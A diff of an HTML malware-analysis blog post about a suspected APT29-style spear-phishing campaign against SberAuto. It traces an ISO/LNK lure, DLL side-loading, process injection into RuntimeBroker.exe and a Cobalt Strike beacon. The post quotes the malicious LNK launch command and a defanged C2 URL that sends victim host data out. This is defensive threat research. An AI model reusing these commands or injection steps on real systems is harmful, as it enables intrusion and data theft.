@@ -112,41 +112,41 @@
 
     <div class="article-content e-content" itemprop="articleBody">
         <h3 id="summary">Summary</h3>
-<p>On December 19, 2022 malware researcher <strong>StopMalvertisin</strong> twitted a possible about a possible APT29 attack.</p>
+<p>On December 19, 2022 malware researcher known as <strong>StopMalvertisin</strong> twitted about a possible APT29 attack.</p>
 <p><img src="image-0.png" alt="Alt text"></p>
-<p>The spear-phishing campaign targeted <strong>SberAuto</strong>, an online car trading platform in Russia associated with the state-owned banking and financial services company Sberbank.<br>
+<p>The spear-phishing campaign targeted <strong>SberAuto</strong>, a Russian online car trading platform associated with the state-owned banking and financial services company <strong>Sberbank</strong>.<br>
 The analyzed attack displayed similar TTPs commonly attributed to <strong>APT29</strong> (aka <strong>Cozy Bear</strong>), even though it is unclear why a Russian-backed hacking group should be targeting a domestic web service.</p>
 <h2 id="technical-analysis">Technical Analysis</h2>
 <h3 id="initial-stage">Initial Stage</h3>
-<p>The first stage of this attack is represented by an <strong>ISO</strong> file (0b32bd907072d95223e5eb2dc5e3d9e0) named Алкоголь_2023_zip.iso (i.e., &ldquo;Alcohol&rdquo;), uploaded on VirusTotal on December 19, 2022 from <strong>Russia</strong> and potentially delivered as an email attachment.</p>
+<p>The first stage of this attack is represented by an <strong>ISO</strong> file (0b32bd907072d95223e5eb2dc5e3d9e0) named &ldquo;Алкоголь_2023_zip.iso&rdquo; (i.e., &ldquo;Alcohol&rdquo;), uploaded on VirusTotal from Russia on December 19, 2022 and potentially delivered as an email attachment.</p>
 <p><img src="image-1.png" alt="Alt text"></p>
 <p>The archive content closely resembles the one of previous APT29 campaigns.</p>
 <p><img src="image-2.png" alt="Alt text"></p>
-<p>The only folder visible item is a shortcut file disguised as Алкоголь_2023.pdf.</p>
-<p><code>%windir%/system32/cmd.exe /c start update.exe &amp; &quot;%ProgramFiles(x86)%/Microsoft/Edge/Application/msedge.exe&quot; %cd%/alcohol.pdf</code></p>
-<p>Once clicked on the <strong>LNK</strong> file, <strong>update.exe</strong> is firstly executed, followed by the lure PDF document called &ldquo;alcohol.pdf&rdquo;, whose displays shows the alcohol catalog from the Russian chain called <strong>Globus Gourmet</strong>.</p>
+<p>The only folder visible item is a shortcut file disguised as &ldquo;Алкоголь_2023.pdf&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#40ffff">%windir%</span>/system32/cmd.exe /c start update.exe &amp; <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">%ProgramFiles(x86)%</span><span style="color:#ed9d13">/Microsoft/Edge/Application/msedge.exe&#34;</span> <span style="color:#40ffff">%cd%</span>/alcohol.pdf
+</span></span></code></pre></div><p>Once clicked on the <strong>LNK</strong> file, <strong>update.exe</strong> is firstly executed, followed by the lure PDF document called &ldquo;alcohol.pdf&rdquo;, which displays the alcohol catalog from the Russian market chain called <strong>Globus Gourmet</strong>.</p>
 <p><img src="image-3.png" alt="Alt text"></p>
-<p>The files &ldquo;thumbcache.dll&rdquo; and &ldquo;update.exe&rdquo; are actually two legit <em>signed binaries</em> of <strong>Microsoft OneDrive</strong>: the latter exploits s<strong>earch order hijacking</strong> to load the malicious DLL named &ldquo;version.dll,&rdquo; which has been modified by the threat actor to load an encrypted payload file.</p>
+<p>The files &ldquo;thumbcache.dll&rdquo; and &ldquo;update.exe&rdquo; are actually two legit <em>signed binaries</em> of <strong>Microsoft OneDrive</strong>: the latter exploits Windows <strong>search order hijacking</strong> to load the malicious DLL named &ldquo;version.dll,&rdquo; which has been modified by the threat actor to load an encrypted payload file.</p>
 <p><img src="image-4.png" alt="Alt text"></p>
 <h3 id="second-stage-versiondll">Second stage: version.dll</h3>
-<p>The dynamic-linked library &ldquo;version.dll&rdquo;  is a 64-bit DLL side-loaded with the legit OneDrive updater binary.
+<p>The dynamic-linked library &ldquo;version.dll&rdquo; is a 64-bit DLL which is side-loaded by the legit Microsoft OneDrive binary.<br>
 The <em>compile-timestamp</em> shows <strong>Sunday, December 18 2022</strong>.</p>
 <p><img src="image-5.png" alt="Alt text"></p>
-<p>The presence of some strings hints that this program was created using <strong>Shhhloader</strong> framework, a &ldquo;shellcode loader that takes raw shellcode as input and compiles a C++ stub that does a bunch of different things to try and bypass AV/EDR&rdquo;.</p>
+<p>The presence of specific strings hints that the program was probably created with <strong>Shhhloader</strong> framework, a &ldquo;shellcode loader that takes raw shellcode as input and compiles a C++ stub that does a bunch of different things to try and bypass AV/EDR&rdquo;.</p>
 <p><img src="image-6.png" alt="Alt text"></p>
-<p>The binary first employs <code>GetComputerNameExA</code> API function to get the hostname of the infected machine and check whether it is equal to <code>corp.sberauto[.]com</code>, an online russian service facilitating car sales website.
+<p>The binary first employs <code>GetComputerNameExA</code> API function to retrieve the hostname of the infected machine and check whether it is equal to <code>corp.sberauto[.]com</code>, an online russian service facilitating car sales website.
 If the hostname does not match, the program terminates.</p>
 <p><img src="image-7.png" alt="Alt text"></p>
 <p>After that, the malicious DLL iterates through the running processes using <code>Process32Next</code> to find the ID of <strong>explorer.exe</strong> and obtain its process handle.</p>
 <p><img src="image-8.png" alt="Alt text"></p>
-<p>It then creates a <em>suspended-process</em> called <strong>RuntimeBroker.exe</strong> using <code>CreateProcessA</code> and sets <strong>explorer.exe</strong> as the parent process via <code>UpdateProcThreadAttribute</code> API.</p>
+<p>It then creates a <em>suspended-process</em> called <strong>RuntimeBroker.exe</strong> using <code>CreateProcessA</code> and sets &ldquo;explorer.exe&rdquo; as the parent process via <code>UpdateProcThreadAttribute</code> API.</p>
 <p><img src="image-9.png" alt="Alt text"></p>
-<p>Finally, it decrypts the shellcode into RuntimeBroker.exe through <code>NtAllocateVirtualMemory</code> and <code>NtWriteVirtualMemory</code>, executing it through <code>NtAlertResumeThread</code>.</p>
+<p>Finally, it decrypts the shellcode into &ldquo;RuntimeBroker.exe&rdquo; through <code>NtAllocateVirtualMemory</code> and <code>NtWriteVirtualMemory</code>, executing it via the <code>NtAlertResumeThread</code> syscall.</p>
 <p><img src="image-10.png" alt="Alt text"></p>
 <h3 id="final-stage-cobalt-strike">Final stage: Cobalt Strike</h3>
-<p>The final payload is a <strong>Cobalt Strike Beacon</strong> that, after obtaining the relevant information of the machine such as <em>username</em>, <em>computer name</em> and <em>computer version</em>, sends them to the <strong>C2</strong> <code>adblockext[.]ru</code> domain via  <strong>Base64-encoded</strong> scheme.</p>
-<p><code>https://adblockext[.]ru/functionalStatus/hw7s8TE4f9GtrBHb8iiFT7RyIAuN?_=BASE64_ENCODED_DATA</code></p>
-<h2 id="conclusion">Conclusion</h2>
+<p>The final payload is a <strong>Cobalt Strike Beacon</strong> that, after obtaining the relevant information about the victim machine such as <em>username</em>, <em>computer name</em> and <em>computer version</em>, sends them to the <strong>C2</strong> <code>adblockext[.]ru</code> domain via  <strong>Base64-encoded</strong> scheme.</p>
+<pre tabindex="0"><code>https://adblockext[.]ru/functionalStatus/hw7s8TE4f9GtrBHb8iiFT7RyIAuN?_=BASE64_ENCODED_DATA
+</code></pre><h2 id="conclusion">Conclusion</h2>
 <p>The similarities with previous APT29 campaigns (i.e., the use of ISO files containing binaries vulnerable to DLL hijacking) may lead to a couple of final hypotheses.<br>
 First, the attacks may be either orchestrated by Ukrainian groups (particularly, the &ldquo;The IT Army of Ukraine&rdquo;) trying to simulate Cozy Bear TTPs.<br>
 Alternately, this could be also a Russian red teaming exercise to enhance internal cybersecurity measures.</p>
